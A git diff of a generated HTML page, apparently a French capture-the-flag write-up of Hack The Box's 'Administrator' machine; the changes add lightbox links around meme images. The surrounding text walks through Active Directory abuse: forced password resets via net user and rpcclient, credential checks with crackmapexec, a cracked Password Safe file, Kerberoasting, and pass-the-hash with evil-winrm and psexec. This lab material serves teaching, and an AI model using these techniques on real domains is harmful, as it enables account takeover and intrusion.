@@ -27,7 +27,11 @@
             
                 
             
-    </head>
+     <link href="../../assets/stylesheets/glightbox.min.css" rel="stylesheet"/><style>
+    html.glightbox-open { overflow: initial; height: 100%; }
+    .gslide-title { margin-top: 0px; user-select: text; }
+    .gslide-desc { color: #666; user-select: text; }
+    .gslide-image img { background: white; }</style> <script src="../../assets/javascripts/glightbox.min.js"></script></head>
 
     <body>
         <div class="container py-3">
@@ -282,14 +286,14 @@ Mais pas de share super utile dispo (juste ADMIN$, IPC$, NETLOGON, SYSVOL…). R
 <p>Du coup, je reste dans ma session WinRM avec Olivia et je tape direct :</p>
 <pre><code class="language-powershell">net user michael michael /domain
 </code></pre>
-<p>Yes sir Le mot de passe de <code>michael</code> est maintenant... <code>michael</code>. (Ouais j’ai pas fait dans l’originalité, mais ça marche.)
-<img alt="Cat Table" src="../../assets/memes/CatTable.png" /></p>
+<p>Yes sir Le mot de passe de <code>michael</code> est maintenant... <code>michael</code>. (Ouais j’ai pas fait dans l’originalité, mais ça marche.)</p>
+<p><a class="glightbox" href="../../assets/memes/CatTable.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="Cat Table" src="../../assets/memes/CatTable.png" /></a></p>
 <hr />
 <h3 id="verification">✅ Vérification</h3>
 <p>Je teste le tout avec <code>crackmapexec</code> pour voir si les identifiants passent :</p>
 <pre><code class="language-bash">crackmapexec smb 10.10.11.42 -u 'michael' -p 'michael'
 </code></pre>
-<p>Et là, le feu vert :<img alt="La Patte de l'expert" src="../../assets/memes/FeuVert.png" /></p>
+<p>Et là, le feu vert :<a class="glightbox" href="../../assets/memes/FeuVert.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="La Patte de l'expert" src="../../assets/memes/FeuVert.png" width="600" /></a></p>
 <pre><code>[+] administrator.htb\michael:michael
 </code></pre>
 <p>Je viens officiellement de récupérer un nouveau user. 🏆<br />
@@ -298,7 +302,8 @@ Next stop → <strong>benjamin</strong> 🚀</p>
 <hr />
 <h2 id="prise-de-controle-de-benjamin">🔐 Prise de contrôle de Benjamin</h2>
 <p>Comme j’ai encore BloodHound sous les yeux, je check le node de <strong>michael</strong>, histoire de voir s’il peut m’ouvrir d’autres portes. Et boum : il a un <strong>FDOC</strong> sur <strong>benjamin</strong> avec le droit <strong>ForceChangePassword</strong>.</p>
-<p>🧠 Petit rappel : <code>ForceChangePassword</code> = je peux modifier le mot de passe d’un user <strong>sans même avoir besoin de l’ancien</strong>. Ultra pratique.<img alt="NerdCat" src="../../assets/memes/NerdCat.png" /></p>
+<p>🧠 Petit rappel : <code>ForceChangePassword</code> = je peux modifier le mot de passe d’un user <strong>sans même avoir besoin de l’ancien</strong>. Ultra pratique.
+<a class="glightbox" href="../../assets/memes/NerdCat.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="NerdCat" src="../../assets/memes/NerdCat.png" width="300" /></a></p>
 <hr />
 <h3 id="reset-du-mot-de-passe-via-rpcclient">🔁 Reset du mot de passe via rpcclient</h3>
 <p>J’ai pas besoin de shell pour ça. Je passe direct par <code>rpcclient</code> :</p>
@@ -307,7 +312,7 @@ Next stop → <strong>benjamin</strong> 🚀</p>
 <p>Une fois dedans, je balance :</p>
 <pre><code class="language-bash">setuserinfo2 benjamin 23 'benjamin'
 </code></pre>
-<p>🧠 Ici, <code>23</code> correspond au niveau de sécurité de l’opération (set password). C’est une vieille astuce avec <code>rpcclient</code> pour modifier un mot de passe d’un user sans shell, juste via RPC.<img alt="NerdCat" src="../../assets/memes/NerdCat.png" /></p>
+<p>🧠 Ici, <code>23</code> correspond au niveau de sécurité de l’opération (set password). C’est une vieille astuce avec <code>rpcclient</code> pour modifier un mot de passe d’un user sans shell, juste via RPC.<a class="glightbox" href="../../assets/memes/NerdCat.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="NerdCat" src="../../assets/memes/NerdCat.png" /></a></p>
 <p>Je sors de <code>rpcclient</code>, et je teste les creds fraîchement créés :</p>
 <pre><code class="language-bash">crackmapexec smb 10.10.11.42 -u 'benjamin' -p 'benjamin'
 </code></pre>
@@ -317,7 +322,7 @@ Next stop → <strong>benjamin</strong> 🚀</p>
 <p>🔓 Un compte de plus dans la poche !</p>
 <hr />
 <h2 id="ftp-avec-benjamin-objectif-emily">📁 FTP avec Benjamin – Objectif : Emily</h2>
-<p>Bon, je check vite fait sur BloodHound si <code>benjamin</code> a des droits intéressants. Mais nada, il est tout claqué.<img alt="NerdCat" src="../../assets/memes/OhHellNah.png" />
+<p>Bon, je check vite fait sur BloodHound si <code>benjamin</code> a des droits intéressants. Mais nada, il est tout claqué.<a class="glightbox" href="../../assets/memes/OhHellNah.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="NerdCat" src="../../assets/memes/OhHellNah.png" width="300" /></a>
 Par contre, je remarque qu’il est membre du groupe <strong>Share Moderators</strong>, donc je tente sa connexion sur le <strong>FTP</strong>.</p>
 <pre><code class="language-bash">ftp 10.10.11.42
 </code></pre>
@@ -364,15 +369,15 @@ ftp&gt; get Backup.psafe3
 <p>Et là :</p>
 <pre><code class="language-bash">Backup.psafe3:tekieromucho
 </code></pre>
-<p><img alt="Romantico" src="../../assets/memes/Romantico.png" />
+<p><a class="glightbox" href="../../assets/memes/Romantico.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="Romantico" src="../../assets/memes/Romantico.png" width="300" /></a>
 Ça sent la vibe romantique ce mot de passe mdrrrr (J'ai leak parce que trop drole)</p>
 <hr />
 <h2 id="bloodhound-objectif-ethan">📊 BloodHound : Objectif Ethan</h2>
 <p>Je relance un petit tour dans BloodHound avec ce que j’ai récupéré. Et là je vois qu’<strong>Emily</strong> (dont on vient de récupérer les creds grâce au fichier) a un <strong>GenericWrite</strong> sur l’utilisateur <strong>ethan</strong>.</p>
-<p>🧠 Pour rappel : GenericWrite = je peux modifier les attributs du compte (genre, son SPN) → parfait pour un <strong>Kerberoasting</strong>.<img alt="NerdCat" src="../../assets/memes/NerdCat.png" /></p>
+<p>🧠 Pour rappel : GenericWrite = je peux modifier les attributs du compte (genre, son SPN) → parfait pour un <strong>Kerberoasting</strong>.<a class="glightbox" href="../../assets/memes/NerdCat.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="NerdCat" src="../../assets/memes/NerdCat.png" width="300" /></a></p>
 <hr />
 <h2 id="sync-de-lheure-kerberos-oblige">🕰️ Sync de l’heure (Kerberos oblige)</h2>
-<p>Avant toute chose, il faut sync sa machine avec l’heure du DC, sinon Kerberos nous claque la porte au nez (Je parle d'experience j'me suis manger un <code>Clock Skew</code>) <img alt="L'homme le plus aigri de France" src="../../assets/memes/Aigri.png" />
+<p>Avant toute chose, il faut sync sa machine avec l’heure du DC, sinon Kerberos nous claque la porte au nez (Je parle d'experience j'me suis manger un <code>Clock Skew</code>) <a class="glightbox" href="../../assets/memes/Aigri.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="L'homme le plus aigri de France" src="../../assets/memes/Aigri.png" /></a>
 :</p>
 <pre><code class="language-bash">sudo ntpdate -u 10.10.11.42
 </code></pre>
@@ -400,12 +405,12 @@ ftp&gt; get Backup.psafe3
 <p>Je peux maintenant me connecter avec <strong>Evil-WinRM</strong> :</p>
 <pre><code class="language-bash">evil-winrm -i 10.10.11.42 -u Administrator -H 3dc553ce4b9fd20bd016e098******
 </code></pre>
-<p>Shell Admin. Et la, c'est la fin<img alt="Explosion" src="../../assets/memes/EXPLOSION.png" /></p>
+<p>Shell Admin. Et la, c'est la fin<a class="glightbox" href="../../assets/memes/EXPLOSION.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="Explosion" src="../../assets/memes/EXPLOSION.png" width="300" /></a></p>
 <p>Et pour les puristes, je sors aussi l’artillerie old school :</p>
 <pre><code class="language-bash">psexec.py administrator.htb/Administrator@10.10.11.42 -hashes :3dc553ce4b9fd20bd016e098******
 </code></pre>
 <p>→ SYSTEM, baby.
-<img alt="Hackeur" src="../../assets/memes/HackerMeme.png" /></p>
+<a class="glightbox" href="../../assets/memes/HackerMeme.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="Hackeur" src="../../assets/memes/HackerMeme.png" width="1000" /></a></p>
 <hr />
 <h2 id="resume-des-users-creds">🧩 Résumé des users / creds</h2>
 <table>
@@ -502,6 +507,7 @@ ftp&gt; get Backup.psafe3
             <script src="../../assets/js/main.min.js""></script>
                 <script src="../../search/main.js" defer></script>
 
-    </body>
+    <script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
+</script></body>
 
 </html>
